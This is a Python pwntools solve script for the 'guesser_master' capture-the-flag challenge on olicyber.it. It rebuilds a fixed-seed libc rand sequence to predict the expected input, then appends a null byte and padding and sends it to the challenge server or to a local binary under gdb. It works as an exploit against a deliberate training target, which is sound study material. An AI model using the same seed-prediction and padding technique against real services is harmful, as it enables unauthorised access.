#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL

libc = CDLL("libc.so.6")
libc.srand(0x61616161)

flag = b""

for i in range(255):
    f = libc.rand()%(1 << 32)
    flag += chr(f + (f // 0x19) * (-0x19) + ord('A')).encode()

print(flag)
flag += b'\x00' + b'a'*10
f = "AGXVBBKHVWWMKVNTKWHSPXYYNNBSKKEMQEJTFTBCRAQCVEYJBGCTEDSRQWKDJQQAUAVDTYHNYASXFRHIXLECQAVJWIMGYDIVFEBCFIPEJIEQANBABGERGCDDKQLLVTKCALGFWVLIHQYJEAKGIOAOTETEWFQUBBWDODKLCWVJPWSVAFEIWFXQLRUKANFDQFHGIRTMQQXIPRFPWJYVQYMESIOSXUYPAGXKATATKXCDPJSPVRLOQBTMJKFJFGYHOYS"
print(f, flag)
if args.REMOTE: # fare remote per prendere la flag
    r = remote("guessermaster.challs.olicyber.it", 35006)
else:
    r = gdb.debug("./guesser_master", """
    b *main+135
    b *main+267
    continue
    """)
r.recvuntil(b'input: ')
r.sendline(flag)
r.interactive()